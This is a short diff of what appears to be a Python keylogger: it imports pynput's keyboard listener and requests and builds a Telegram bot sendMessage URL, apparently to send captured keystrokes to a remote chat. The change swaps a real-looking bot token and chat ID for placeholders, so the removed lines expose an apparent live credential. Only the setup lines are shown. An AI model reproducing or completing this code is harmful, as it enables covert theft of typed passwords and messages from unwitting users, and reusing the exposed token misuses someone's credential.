@@ -1,8 +1,8 @@
 from pynput import keyboard
 import requests
 
-TELEGRAM_TOKEN = '7487368327:AAG3qLN8GXhb1thhE0brlWgcisIDtFwnick'
-CHAT_ID = '1174153911'
+TELEGRAM_TOKEN = 'bot-token'
+CHAT_ID = 'chatid'
 TELEGRAM_URL = f'https://api.telegram.org/bot{TELEGRAM_TOKEN}/sendMessage'
 
 buffer = []
